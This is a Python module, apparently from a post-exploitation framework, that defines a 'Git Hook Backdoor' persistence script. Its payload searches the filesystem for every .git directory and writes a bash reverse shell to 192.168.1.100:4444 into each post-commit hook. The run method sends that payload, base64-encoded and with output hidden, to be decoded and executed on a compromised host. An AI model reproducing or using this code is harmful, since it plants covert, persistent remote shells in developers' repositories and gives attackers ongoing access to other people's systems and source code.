"""Git hook backdoor script."""
from ..base import OperatorScript, ScriptResult

class GitHookBackdoor(OperatorScript):
    name = "Git Hook Backdoor"
    description = "Git hook persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] GIT HOOK BACKDOOR"
find / -name ".git" -type d 2>/dev/null | while read gitdir; do
    echo "[!] Found git repo: $gitdir"
    echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &" > "$gitdir/hooks/post-commit" 2>/dev/null
    chmod +x "$gitdir/hooks/post-commit" 2>/dev/null
done
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Git hook backdoor...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Git hook backdoor executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
